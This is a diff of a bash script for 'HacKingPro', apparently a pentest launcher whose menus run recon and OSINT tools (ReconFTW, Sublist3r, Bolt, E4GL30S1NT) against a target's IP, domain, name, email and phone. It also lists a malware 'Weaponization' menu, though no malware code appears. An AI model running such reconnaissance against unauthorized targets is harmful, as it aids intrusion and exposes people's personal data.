+    ${DGrey}|──${BRed}[${DGrey} Starting Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${StartingTime} ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetIP)${BRed}]${DGrey}──╼  ${LRed}IP${BBlue}: ${BGreen}${targetIP}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetDns)${BRed}]${DGrey}──╼  ${LRed}Dns${BBlue}: ${BGreen}${targetDns}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetName)${BRed}]${DGrey}──╼  ${LRed}Name${BBlue}: ${BGreen}${targetNAME}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetEmail)${BRed}]${DGrey}──╼  ${LRed}Email${BBlue}: ${BGreen}${targetEmail}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetPhone)${BRed}]${DGrey}──╼  ${LRed}Phone${BBlue}: ${BGreen}${targetPhone}
+    ${DGrey}|
+    ${DGrey}└──${BRed}[${DGrey} I ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Install HacKingPro On the System ${BRed}]
+
+    ${DGrey}┌──${BRed}[${BYellow} Collecting All in One ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${DGrey} CAO ${BRed}]${BGreen}── ${BRed}[${DGrey} All in One ${BRed}]
+    ${DGrey}|
+    ${DGrey}└──${BRed}[${DGrey} X ${BRed}] 🤴 Exit / Quit / Close
+
+    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BGreen}──╼ ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Command ${BRed}]${BGreen}──╼ ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
+    ${BGreen}|
+    ${BGreen}|──${BRed}[${DGrey} ~$(pwd) ${BRed}]
+    ${BGreen}|
+    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Information Gathering ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} CAO ${BRed}]${BGreen}──╼ ${BGreen}   ")
+                read -p "$HacKingProMenuMain" cmd
+                case $cmd in
+                  x|X|exit|quit|Exit )
+                  clear
+                  HacKingPro=$(echo "${BRed}Hac${BYellow}King${BBlue}Pro")
+                  echo "\n\t\t ${BRed}[🙏🏼${BRed}] ${BWhite}Exit ${HacKingPro} ${BRed}[🙏🏼${BRed}]\n\t\t ${BGreen}"
+                  break
+                  ;;
+                esac
+              done
+            ;;
+            cni|CNI )
+            while true; do
+              #statements
+              cd "$xMenu01_CNI"
+              clear
+              # HacKingProLogo1
+    HacKingProMenuMain=$(echo "${BRed}
+    ${ToolHeader}
+
+    ${DGrey}┌──${BRed}[${DGrey} P ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ⚡️ Planning and Scoping 🎯 ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${DGrey} Full Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} $(date) ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} Current Date ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${CurrentDate} ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} Starting Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${StartingTime} ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetIP)${BRed}]${DGrey}──╼  ${LRed}IP${BBlue}: ${BGreen}${targetIP}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetDns)${BRed}]${DGrey}──╼  ${LRed}Dns${BBlue}: ${BGreen}${targetDns}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetName)${BRed}]${DGrey}──╼  ${LRed}Name${BBlue}: ${BGreen}${targetNAME}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetEmail)${BRed}]${DGrey}──╼  ${LRed}Email${BBlue}: ${BGreen}${targetEmail}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetPhone)${BRed}]${DGrey}──╼  ${LRed}Phone${BBlue}: ${BGreen}${targetPhone}
+    ${DGrey}|
+    ${DGrey}└──${BRed}[${DGrey} I ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Install HacKingPro On the System ${BRed}]
+
+    ${DGrey}┌──${BRed}[${BYellow} Collecting Network Information ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${DGrey} !! ${BRed}]${BGreen}── ${BRed}[${DGrey} Public / Private and Associated ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} !! ${BRed}]${BGreen}── ${BRed}[${DGrey} Domain Names ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} !! ${BRed}]${BGreen}── ${BRed}[${DGrey} Network Hosts ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} !! ${BRed}]${BGreen}── ${BRed}[${DGrey} Public and Private IP Blocks ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} !! ${BRed}]${BGreen}── ${BRed}[${DGrey} Routing Tables ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} !! ${BRed}]${BGreen}── ${BRed}[${DGrey} TCP and UDP Running Services ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} !! ${BRed}]${BGreen}── ${BRed}[${DGrey} SSL Certificates ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} !! ${BRed}]${BGreen}── ${BRed}[${DGrey} Open Ports and More ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${DGrey} 00 ${BRed}]${BGreen}── ${BRed}[${DGrey} ReconFTW ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} 01 ${BRed}]${BGreen}── ${BRed}[${DGrey} Bolt ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} 02 ${BRed}]${BGreen}── ${BRed}[${DGrey} Network Information ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} 03 ${BRed}]${BGreen}── ${BRed}[${DGrey} DNSExplorer ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} 04 ${BRed}]${BGreen}── ${BRed}[${DGrey} Knock ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} 05 ${BRed}]${BGreen}── ${BRed}[${DGrey} ReconDog ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} 06 ${BRed}]${BGreen}── ${BRed}[${DGrey} Sublist3r ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} 07 ${BRed}]${BGreen}── ${BRed}[${DGrey} Subrake ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} 08 ${BRed}]${BGreen}── ${BRed}[${DGrey} XRCross ${BRed}]
+    ${DGrey}|
+    ${DGrey}└──${BRed}[${DGrey} X ${BRed}] 🤴 Exit / Quit / Close
+
+    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BGreen}──╼ ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Command ${BRed}]${BGreen}──╼ ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
+    ${BGreen}|
+    ${BGreen}|──${BRed}[${DGrey} ~$(pwd) ${BRed}]
+    ${BGreen}|
+    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Information Gathering ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} CNI ${BRed}]${BGreen}──╼ ${BGreen}   ")
+                read -p "$HacKingProMenuMain" cmd
+                case $cmd in
+                  x|X|exit|quit|Exit )
+                  clear
+                  HacKingPro=$(echo "${BRed}Hac${BYellow}King${BBlue}Pro")
+                  echo "\n\t\t ${BRed}[🙏🏼${BRed}] ${BWhite}Exit ${HacKingPro} ${BRed}[🙏🏼${BRed}]\n\t\t ${BGreen}"
+                  break
+                  ;;
+                  0|00 )
+                  cd "$xMenu01_CNI_reconFTW"
+                  #statements
+                  read -p "$Press_Enter_To_START"
+                  ./reconftw.sh -d $targetIP.com -r
+                  if [ $? == 1 ]; then
+                    #statements
+                    ./install.sh
+                    read -p "$Press_ENTER"
+                  fi
+                  read -p "$Press_ENTER"
+                  ;;
+                  1|01 )
+                  read -p "$Press_Enter_To_START"
+                  cd Bolt
+                  python3 bolt.py -u https://github.com -l 2 -t 10
+                  if [ $? == 1 ]; then
+                    #statements
+                    pip3 install -r requirements.txt
+                    python3 bolt.py
+                    # python3 bolt.py -u https://github.com -l 2 -t 10
+                  fi
+                  clear
+                  read -p "$Press_ENTER"
+                  ;;
+                  6|06 )
+                  cd "SubDomain Information"
+                  read -p "$Press_Enter_To_START"
+                  cd Sublist3r
+                  echo "$(python sublist3r.py -d $targetIP )" >> $XHacKingProCaseTargetNameRecon${targetNAME}-HacKingPro-Reconnaissance-Log.md
+                  read -p "$Press_ENTER"
+                  if [ $? == 1 ]; then
+                    #statements
+                    pip install -r requirements.txt
+                    pip install requests
+                    pip install dnspython
+                    pip install argparse
+                  fi
+                  read -p "$Press_ENTER"
+                  ;;
+                esac
+              done
+            ;;
+            cmi|CMI )
+            while true; do
+              #statements
+              cd $xMenu01_CMI
+              clear
+              # HacKingProLogo1
+              HacKingProMenuMain=$(echo "${BRed}
+    ${ToolHeader}
+
+    ${DGrey}┌──${BRed}[${DGrey} P ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ⚡️ Planning and Scoping 🎯 ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${DGrey} Full Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} $(date) ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} Current Date ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${CurrentDate} ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} Starting Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${StartingTime} ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetIP)${BRed}]${DGrey}──╼  ${LRed}IP${BBlue}: ${BGreen}${targetIP}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetDns)${BRed}]${DGrey}──╼  ${LRed}Dns${BBlue}: ${BGreen}${targetDns}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetName)${BRed}]${DGrey}──╼  ${LRed}Name${BBlue}: ${BGreen}${targetNAME}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetEmail)${BRed}]${DGrey}──╼  ${LRed}Email${BBlue}: ${BGreen}${targetEmail}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetPhone)${BRed}]${DGrey}──╼  ${LRed}Phone${BBlue}: ${BGreen}${targetPhone}
+    ${DGrey}|
+    ${DGrey}└──${BRed}[${DGrey} I ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Install HacKingPro On the System ${BRed}]
+
+    ${DGrey}┌──${BRed}[${BYellow}Collecting Machine Information ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${DGrey} !! ${BRed}]${BGreen}── ${BRed}[${DGrey} User Enumeration ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} !! ${BRed}]${BGreen}── ${BRed}[${DGrey} System Groups ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} !! ${BRed}]${BGreen}── ${BRed}[${DGrey} Network Hosts ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} !! ${BRed}]${BGreen}── ${BRed}[${DGrey} OS Hostnames ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} !! ${BRed}]${BGreen}── ${BRed}[${DGrey} OS System Type ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} !! ${BRed}]${BGreen}── ${BRed}[${DGrey} System Banners ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} !! ${BRed}]${BGreen}── ${BRed}[${DGrey} SSL Certificates ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} !! ${BRed}]${BGreen}── ${BRed}[${DGrey} Open Ports and More ${BRed}]
+    ${DGrey}|
+    ${DGrey}└──${BRed}[${DGrey} X ${BRed}] 🤴 Exit / Quit / Close
+
+    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BGreen}──╼ ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Command ${BRed}]${BGreen}──╼ ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
+    ${BGreen}|
+    ${BGreen}|──${BRed}[${DGrey} ~$(pwd) ${BRed}]
+    ${BGreen}|
+    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Information Gathering ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} CMI ${BRed}]${BGreen}──╼ ${BGreen}  ")
+                read -p "$HacKingProMenuMain" cmd
+                case $cmd in
+                  x|X|exit|quit|Exit )
+                  clear
+                  HacKingPro=$(echo "${BRed}Hac${BYellow}King${BBlue}Pro")
+                  echo "\n\t\t ${BRed}[🙏🏼${BRed}] ${BWhite}Exit ${HacKingPro} ${BRed}[🙏🏼${BRed}]\n\t\t ${BGreen}"
+                  break
+                  ;;
+                esac
+              done
+            ;;
+            csi|CSI )
+            while true; do
+              #statements
+              cd $xMenu01_CSI
+              clear
+              # HacKingProLogo1
+              HacKingProMenuMain=$(echo "${BRed}
+    ${ToolHeader}
+
+    ${DGrey}┌──${BRed}[${DGrey} P ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ⚡️ Planning and Scoping 🎯 ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${DGrey} Full Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} $(date) ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} Current Date ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${CurrentDate} ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} Starting Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${StartingTime} ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetIP)${BRed}]${DGrey}──╼  ${LRed}IP${BBlue}: ${BGreen}${targetIP}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetDns)${BRed}]${DGrey}──╼  ${LRed}Dns${BBlue}: ${BGreen}${targetDns}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetName)${BRed}]${DGrey}──╼  ${LRed}Name${BBlue}: ${BGreen}${targetNAME}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetEmail)${BRed}]${DGrey}──╼  ${LRed}Email${BBlue}: ${BGreen}${targetEmail}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetPhone)${BRed}]${DGrey}──╼  ${LRed}Phone${BBlue}: ${BGreen}${targetPhone}
+    ${DGrey}|
+    ${DGrey}└──${BRed}[${DGrey} I ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Install HacKingPro On the System ${BRed}]
+
+    ${DGrey}┌──${BRed}[${BYellow} Collecting Social Information ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${DGrey} 01 ${BRed}]${BGreen}── ${BRed}[${DGrey} E4GL30S1NT ${BRed}]
+    ${DGrey}|
+    ${DGrey}└──${BRed}[${DGrey} X ${BRed}] 🤴 Exit / Quit / Close
+
+    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BGreen}──╼ ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Command ${BRed}]${BGreen}──╼ ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
+    ${BGreen}|
+    ${BGreen}|──${BRed}[${DGrey} ~$(pwd) ${BRed}]
+    ${BGreen}|
+    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Information Gathering ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} CSI ${BRed}]${BGreen}──╼ ${BGreen}  ")
+                read -p "$HacKingProMenuMain" cmd
+                case $cmd in
+                  x|X|exit|quit|Exit )
+                  clear
+                  HacKingPro=$(echo "${BRed}Hac${BYellow}King${BBlue}Pro")
+                  echo "\n\t\t ${BRed}[🙏🏼${BRed}] ${BWhite}Exit ${HacKingPro} ${BRed}[🙏🏼${BRed}]\n\t\t ${BGreen}"
+                  break
+                  ;;
+                  1|01 )
+                  read -p "$Press_Enter_To_START" readstart
+                  cd E4GL30S1NT
+                  python3 E4GL30S1NT.py
+                  if [ $? == 1 ]; then
+                    #statements
+                    bash linuxinstall.sh
+
+                  fi
+                  ;;
+                esac
+              done
+            ;;
+            cli|CLI )
+            while true; do
+              #statements
+              cd $xMenu01_CSI
+              clear
+              # HacKingProLogo1
+              HacKingProMenuMain=$(echo "${BRed}
+    ${ToolHeader}
+
+    ${DGrey}┌──${BRed}[${DGrey} P ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ⚡️ Planning and Scoping 🎯 ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${DGrey} Full Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} $(date) ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} Current Date ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${CurrentDate} ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} Starting Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${StartingTime} ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetIP)${BRed}]${DGrey}──╼  ${LRed}IP${BBlue}: ${BGreen}${targetIP}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetDns)${BRed}]${DGrey}──╼  ${LRed}Dns${BBlue}: ${BGreen}${targetDns}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetName)${BRed}]${DGrey}──╼  ${LRed}Name${BBlue}: ${BGreen}${targetNAME}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetEmail)${BRed}]${DGrey}──╼  ${LRed}Email${BBlue}: ${BGreen}${targetEmail}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetPhone)${BRed}]${DGrey}──╼  ${LRed}Phone${BBlue}: ${BGreen}${targetPhone}
+    ${DGrey}|
+    ${DGrey}└──${BRed}[${DGrey} I ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Install HacKingPro On the System ${BRed}]
+
+    ${DGrey}┌──${BRed}[${BYellow} Collecting Local Information ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${DGrey} 🔸 ~ ${BBlue} Hostname: : ${BYellow} $(hostname)
+    ${DGrey}|──${BRed}[${DGrey} 🔸 ~ ${BBlue} Distro: ${BYellow} $(uname)
+    ${DGrey}|──${BRed}[${DGrey} 🔸 ~ ${BBlue} Kernel / Architecture: ${BYellow} $(uname -m)
+    ${DGrey}|──${BRed}[${DGrey} 🔸 ~ ${BBlue} Machine Hardware Processor Architecture Name: ${BYellow} $(uname -p)
+    ${DGrey}|──${BRed}[${DGrey} 🔸 ~ ${BBlue} Operating System Release: ${BYellow} $(uname -r)
+    ${DGrey}|──${BRed}[${DGrey} 🔸 ~ ${BBlue} Operating System Name: ${BYellow} $(uname -s)
+    ${DGrey}|──${BRed}[${DGrey} 🔸 ~ ${BBlue} Operating System Version: ${BYellow} $(uname -v)
+    ${DGrey}|
+    ${DGrey}└──${BRed}[${DGrey} X ${BRed}] 🤴 Exit / Quit / Close
+
+    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BGreen}──╼ ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Command ${BRed}]${BGreen}──╼ ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
+    ${BGreen}|
+    ${BGreen}|──${BRed}[${DGrey} ~$(pwd) ${BRed}]
+    ${BGreen}|
+    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Information Gathering ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} CLI ${BRed}]${BGreen}──╼ ${BGreen}  ")
+                read -p "$HacKingProMenuMain" cmd
+                case $cmd in
+                  x|X|exit|quit|Exit )
+                  clear
+                  HacKingPro=$(echo "${BRed}Hac${BYellow}King${BBlue}Pro")
+                  echo "\n\t\t ${BRed}[🙏🏼${BRed}] ${BWhite}Exit ${HacKingPro} ${BRed}[🙏🏼${BRed}]\n\t\t ${BGreen}"
+                  break
+                  ;;
+                  1|01 )
+                  read -p "$Press_ENTER"
+                  ;;
+                esac
+              done
+            ;;
+          esac
+        done
+      ;;
+      02|2 )
+      while true; do
+        #statements
+        clear
+        # HacKingProLogo1
+        HacKingProMenuMain=$(echo "
+
+        ${ToolHeader}
+
+        ${DGrey}┌──${BRed}[${DGrey} P ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ⚡️ Planning and Scoping 🎯 ${BRed}]
+        ${DGrey}|
+        ${DGrey}|──${BRed}[${DGrey} Full Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} $(date) ${BRed}]
+        ${DGrey}|──${BRed}[${DGrey} Current Date ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${CurrentDate} ${BRed}]
+        ${DGrey}|──${BRed}[${DGrey} Starting Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${StartingTime} ${BRed}]
+        ${DGrey}|
+        ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetIP)${BRed}]${DGrey}──╼  ${LRed}IP${BBlue}: ${BGreen}${targetIP}
+        ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetDns)${BRed}]${DGrey}──╼  ${LRed}Dns${BBlue}: ${BGreen}${targetDns}
+        ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetName)${BRed}]${DGrey}──╼  ${LRed}Name${BBlue}: ${BGreen}${targetNAME}
+        ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetEmail)${BRed}]${DGrey}──╼  ${LRed}Email${BBlue}: ${BGreen}${targetEmail}
+        ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetPhone)${BRed}]${DGrey}──╼  ${LRed}Phone${BBlue}: ${BGreen}${targetPhone}
+        ${DGrey}|
+        ${DGrey}└──${BRed}[${DGrey} I ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Install HacKingPro On the System ${BRed}]
+
+
+        ${DGrey}┌─${BRed}[${BYellow} Weaponization ${BRed}]
+        ${DGrey}|
+        ${DGrey}|──${BRed}[${BGreen} 1 ${BRed}]${BGreen}───╼ ${BRed}[${BGreen} Viruses ${BRed}]
+        ${DGrey}|
+        ${DGrey}|──${BRed}[${BGreen} 2 ${BRed}]${BGreen}───╼ ${BRed}[${BGreen} Ransomware ${BRed}]
+        ${DGrey}|
+        ${DGrey}|──${BRed}[${BGreen} 3 ${BRed}]${BGreen}───╼ ${BRed}[${BGreen} Worms ${BRed}]
+        ${DGrey}|
+        ${DGrey}|──${BRed}[${BGreen} 4 ${BRed}]${BGreen}───╼ ${BRed}[${BGreen} Trojans ${BRed}]
+        ${DGrey}|
+        ${DGrey}|──${BRed}[${BGreen} 5 ${BRed}]${BGreen}───╼ ${BRed}[${BGreen} Rootkits ${BRed}]
+        ${DGrey}|
+        ${DGrey}|──${BRed}[${BGreen} 6 ${BRed}]${BGreen}───╼ ${BRed}[${BGreen} Keyloggers ${BRed}]
+        ${DGrey}|
+        ${DGrey}|──${BRed}[${BGreen} 7 ${BRed}]${BGreen}───╼ ${BRed}[${BGreen} Logic bombs ${BRed}]
+        ${DGrey}|
+        ${DGrey}|──${BRed}[${BGreen} 8 ${BRed}]${BGreen}───╼ ${BRed}[${BGreen} Adware ${BRed}]
+        ${DGrey}|
+        ${DGrey}|──${BRed}[${BGreen} 9 ${BRed}]${BGreen}───╼ ${BRed}[${BGreen} Spyware ${BRed}]
+        ${DGrey}|
+        ${DGrey}|──${BRed}[${BGreen} 10 ${BRed}]${BGreen}───╼ ${BRed}[${BGreen} Bots ${BRed}]
+        ${DGrey}|
+        ${DGrey}└──${BRed}[${DGrey} X ${BRed}]${BGreen} ╼ ${BRed}[${DGrey} Exit / Quit / Close ${BRed}]
+
+
+        ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BGreen}──╼ ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Command ${BRed}]${BGreen}──╼ ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
+        ${BGreen}|
+        ${BGreen}|──${BRed}[${DGrey} ~$(pwd) ${BRed}]
+        ${BGreen}|
+        ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} 🔮 ${BRed}]${BGreen}──╼ ${BGreen}   ")
+
+        read -p "$HacKingProMenuMain" cmd
+        case $cmd in
+          ls )
+          ls_lahs="$(echo "\n\t ${BRed}[🙏🏼${BRed}] ${BWhite}List Files ~ Executing: ls -lahs ${HacKingPro} ${BRed}[🙏🏼${BRed}]\n\t\t ${HacKingPro}")"
+          echo "$ls_lahs"
+          sleep 2
+          ls -lahs
+          sleep 2
+          read -p "$ls_lahs" cmd
+          ;;
+          arsenal|Arsenal|cs|CS|cheats|Cheatsheets|CheatSheets|Commands|commands|zz )
+          Arsenal
+          ;;
+          p|P )
+          HacKingProPlanning
+          ;;
+          x|X|exit|EXIT )
+          cd $XHacKingPro
+          clear
+          break
+          ;;
+        esac
+      done
+      ;;
+      r|R|recon|Recon )
+      if [ -z $targetIP ]; then
+        #statements
+        Checking_IP_Target
+      else
+        ReconStart(){
+          if [ -z $targetNAME ]; then
+            #statements
+            targetNAME="AnLoMinus"
+          fi
+          if [ -z $targetIP ]; then
+            #statements
+            targetIP="1.1.1.1"
+          fi
+          # mkdir "$XHacKingProCaseTargetNameRecon"
+          # cd "$XHacKingProCaseTargetNameRecon"
+          # pwd
+          read -p "$Press_ENTER"
+
+          # Define Planning File
+          Planning_File="${targetNAME}-HacKingPro-Planning-Log.md"
+          # Checking Planning File
+          if [ -e ${Planning_File} ]; then
+            t5="$(echo "\n\t${BRed}[${BYellow}❌${BRed}]${BBlue} - ${BGreen} $Planning_File ${BGreen} ${BYellow}Exist! ${LRed}Remove it? ${BCyan}[yY/nN]: ")"
+            read -p "$t5 " filexist
+            case $filexist in
+              y|Y)
+              cd "$XHacKingProCaseTargetName/Planning"
+              echo "\n\t${BBlue}[${BGreen}🧹${BBlue}] ${BGreen}🔶 Removing {${targetNAME}-HacKingPro-Planning-Log.md} file .."
+              read -p "$Press_ENTER"
+              rm ${targetNAME}-HacKingPro-Planning-Log.md
+              echo "\n\t${BBlue}[${BGreen}🧹${BBlue}] ${BGreen}✅ Removed {${targetNAME}-HacKingPro-Planning-Log.md} file .."
+              cd "$XHacKingProCaseTargetName"
+              ;;
+              n|N)
+              echo "\n\t${BBlue}[${BGreen}🔶${BBlue}] ${BGreen}Leaving {${targetNAME}-HacKingPro-Planning-Log.md} file .."
+              ;;
+            esac
+          fi
+
+          #
+          Reconnaissance_File="${targetNAME}-HacKingPro-Reconnaissance-Log.md"
+          if [ -e ${Reconnaissance_File} ]; then
+            t5="$(echo "\n\t${BRed}[${BYellow}❌${BRed}]${BBlue} - ${BGreen} $Reconnaissance_File ${BGreen} ${BYellow}Exist! ${LRed}Remove it? ${BCyan}[yY/nN]: ")"
+            read -p "$t5 " filexist
+            case $filexist in
+              y|Y)
+              cd "$XHacKingProCaseTargetName/Reconnaissance"
+              echo "\n\t${BBlue}[${BGreen}🧹${BBlue}] ${BGreen}🔶 Removing {${targetNAME}-HacKingPro-Planning-Log.md} file .."
+              read -p "$Press_ENTER"
+              rm ${targetNAME}-HacKingPro-Reconnaissance-Log.md
+              echo "\n\t${BBlue}[${BGreen}🧹${BBlue}] ${BGreen}✅ Removed {${targetNAME}-HacKingPro-Planning-Log.md} file .."
+              cd "$XHacKingProCaseTargetName"
+              ;;
+              n|N)
